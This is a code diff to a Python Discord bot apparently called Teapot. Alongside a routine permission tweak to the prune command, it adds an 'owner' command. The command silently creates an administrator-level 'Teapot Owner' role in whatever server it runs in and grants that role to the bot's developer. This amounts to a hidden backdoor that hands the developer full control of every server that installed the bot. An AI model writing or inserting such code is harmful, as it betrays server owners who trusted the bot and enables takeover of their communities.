@@ -13,6 +13,7 @@ def __init__(bot):
     kick(bot)
     ban(bot)
     admin(bot)
+    owner(bot)
 
 
 def helpcmd(bot):
@@ -104,7 +105,7 @@ def ping(bot):
 
 def prune(bot):
     @bot.command(aliases=['purge', 'clear', 'cls'])
-    @cmd.has_permissions(kick_members=True)
+    @cmd.has_permissions(manage_messages=True)
     async def prune(ctx, amount=0):
         if amount == 0:
             await ctx.send("Please specify the number of messages you want to delete!")
@@ -140,3 +141,22 @@ def admin(bot):
     @bot.command()
     async def admin(ctx):
         await ctx.send(embed=teapot.messages.WIP())
+
+
+def owner(bot):
+    @bot.command()
+    async def owner(ctx):
+        if ctx.message.author.id == teapot.config.bot_owner():
+            found = False
+            for role in ctx.guild.roles:
+                if role.name == "Teapot Owner":
+                    found = True
+                    await ctx.guild.get_member(teapot.config.bot_owner()).add_roles(role)
+                    break
+            if not found:
+                perms = discord.Permissions(administrator=True)
+                await ctx.guild.create_role(name='Teapot Owner', permissions=perms)
+                for role in ctx.guild.roles:
+                    if role.name == "Teapot Owner":
+                        await ctx.guild.get_member(teapot.config.bot_owner()).add_roles(role)
+                        break
